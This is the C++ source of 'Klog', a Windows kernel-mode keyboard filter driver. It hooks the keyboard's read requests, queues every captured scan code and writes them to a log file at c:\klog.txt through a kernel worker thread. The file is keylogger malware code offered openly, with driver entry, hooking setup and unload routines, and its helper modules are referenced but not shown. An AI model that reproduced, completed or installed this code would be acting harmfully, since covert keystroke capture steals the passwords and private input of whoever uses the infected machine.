
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// Klog by Clandestiny
// Email: clandestiny@despammed.com
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdHook.h"
#include "KbdLog.h"
#include "ScanCode.h"

int numPendingIrps = 0;

/////////////////////////////////////////////////////////////////////
//  DriverEntry
//
//	Routine Description:
//		This is the first entry point called by the system when the
//		driver is loaded.
// 
//	Parameters:
//	    DriverObject - pointer to the driver object
//		RegistryPath - String used to find driver parameters in the
//			registry.  To locate Klog look for:
//			HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Klog
//
//	Return Value:
//		NTSTATUS - Return STATUS_SUCCESS if no errors are encountered.
//			Any other indicates to the system that an error has occured.
//
//	Comments:
//		Must call InitializeCppRunTime() to setup the C++ runtime environment.
//

//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
{	
	NTSTATUS Status = {0};
	
	DbgPrint("Keyboard Filter Driver - DriverEntry\nCompiled at " __TIME__ " on " __DATE__ "\n");
 		
	/////////////////////////////////////////////////////////////////////////////////////////
	// Fill in IRP dispatch table in the DriverObject to handle I/O Request Packets (IRPs) 
	/////////////////////////////////////////////////////////////////////////////////////////
	
	// For a filter driver, we want pass down ALL IRP_MJ_XX requests to the driver which
	// we are hooking except for those we are interested in modifying.
	for(int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	DbgPrint("Filled dispatch table with generic pass down routine...\n");

	//Explicitly fill in the IRP's we want to hook
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	
	//Go ahead and hook the keyboard now
	HookKeyboard(pDriverObject);
	DbgPrint("Hooked IRP_MJ_READ routine...\n");

	//Set up our worker thread to handle file writes of the scan codes extracted from the 
	//read IRPs
	InitThreadKeyLogger(pDriverObject);

	//Initialize the linked list that will serve as a queue to hold the captured keyboard scan codes
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension; 
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	//Initialize the lock for the linked list queue
	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	//Initialize the work queue semaphore
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0 , MAXLONG);

	//Create the log file
	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
    STRING		 ntNameString;
	UNICODE_STRING uFileName;
    RtlInitAnsiString( &ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE );
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile,GENERIC_WRITE,&obj_attrib,&file_status,
							NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS)
	{
		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n",file_status);
	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n",pKeyboardDeviceExtension->hLogFile);
	}

	// Set the DriverUnload procedure
	pDriverObject->DriverUnload = Unload;
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}

//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp )
{
	DbgPrint("Entering DispatchPassDown Routine...\n");
	//pass the irp down to the target without touching it
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);
}//end DriverDispatcher


//@@@@@@@@@@@@@@@@@@@@@@@@
// IRQL = passive level
//@@@@@@@@@@@@@@@@@@@@@@@@@
VOID Unload( IN PDRIVER_OBJECT pDriverObject)
{
	//Get the pointer to the device extension
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension; 
	DbgPrint("Driver Unload Called...\n");
	
	//Detach from the device underneath that we're hooked to
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	DbgPrint("Keyboard hook detached from device...\n");

	///////////////////////////////////////////////////////////////
	//Wait for our tagged IRPs to die before we remove the device
	///////////////////////////////////////////////////////////////
	DbgPrint("There are %d tagged IRPs\n",numPendingIrps);
	DbgPrint("Waiting for tagged IRPs to die...\n");

	//Create a timer
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000; //.1 s
	KeInitializeTimer(&kTimer);
	
	while(numPendingIrps > 0)
	{
		//Set the timer
		KeSetTimer(&kTimer,timeout,NULL);
		KeWaitForSingleObject(&kTimer,Executive,KernelMode,false ,NULL);
	}
	
	//Set our key logger worker thread to terminate
	pKeyboardDeviceExtension ->bThreadTerminate = true;

	//Wake up the thread if its blocked & WaitForXXX after this call
	KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,TRUE);

	//Wait till the worker thread terminates	
	DbgPrint("Waiting for key logger thread to terminate...\n");
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj,
			Executive,KernelMode,false,NULL);
	DbgPrint("Key logger thread termintated\n");

	//Close the log file
	ZwClose(pKeyboardDeviceExtension->hLogFile);

	//Delete the device
	IoDeleteDevice(pDriverObject->DeviceObject);
	DbgPrint("Tagged IRPs dead...Terminating...\n");

	return;
}

